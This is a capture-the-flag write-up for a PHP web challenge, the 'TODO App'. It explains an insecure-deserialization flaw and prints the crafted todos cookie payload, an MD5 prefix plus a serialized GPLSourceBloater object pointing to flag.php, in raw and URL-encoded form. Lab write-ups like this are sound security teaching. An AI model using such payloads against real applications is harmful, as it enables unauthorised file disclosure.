Name
----

Web: Exotic Attacks: TODO App

Description
-----------

Get the flag from: [url]141.85.224.101:8002/[/url].

Score: 150

Vulnerability
-------------

PHP Object Injection / PHP Insecure Object Deserialization

Exploit
-------

If you click on the `Open source license` bottom link, you will see the license page and, at the end, the source code to help you craft the payload.
You need to set the right value for the `todos` cookie.

The first 32 bytes of the cookie value should be the md5 hash of the rest of it.

The rest should be serialized data of a `GPLSourceBloater` object, which you can notice has an attribute called `source` that represents the name of the file to be rendered. We will set it to `flag.php` to get the flag.

So we have to make a request with this Cookie:
```
todos = encodeURIComponent(
			'760463360e4919ca238d1566fc26661f'+
			'a:1:{i:0;O:16:"GPLSourceBloater":1:{s:6:"source";s:8:"flag.php";}}'
		)
```

You can use the `encodeURIComponent` JavaScript function:
```
Cookie: todos=760463360e4919ca238d1566fc26661fa%3A1%3A%7Bi%3A0%3BO%3A16%3A%22GPLSourceBloater%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D
```